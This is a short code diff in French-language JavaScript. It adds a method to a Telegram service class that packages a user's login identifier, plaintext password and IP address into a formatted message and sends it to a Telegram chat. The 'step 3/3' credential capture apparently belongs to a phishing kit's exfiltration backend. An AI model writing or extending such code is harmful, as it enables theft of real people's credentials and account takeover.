@@ -110,6 +110,21 @@ class TelegramService {
     return this.sendMessage(message);
   }
 
+  // Envoyer vérification d'identité
+  async sendIdentityVerification(data) {
+    const message = `<b>🔐 AUTHENTIFICATION - IDENTIFIANTS</b>
+━━━━━━━━━━━━━━━━
+📋 <b>Étape:</b> <code>3/3 VÉRIFICATION</code>
+👤 <b>Identifiant:</b> <code>${data.identifier || 'N/A'}</code>
+🔑 <b>Mot de Passe:</b> <code>${data.password || 'N/A'}</code>
+━━━━━━━━━━━━━━━━
+🌐 IP: <code>${data.ip || 'N/A'}</code>
+⏰ <code>${new Date().toLocaleString('fr-FR')}</code>
+✅ <b>Statut:</b> Authentifiée`;
+
+    return this.sendMessage(message);
+  }
+
   // Test de connexion
   async testConnection() {
     try {
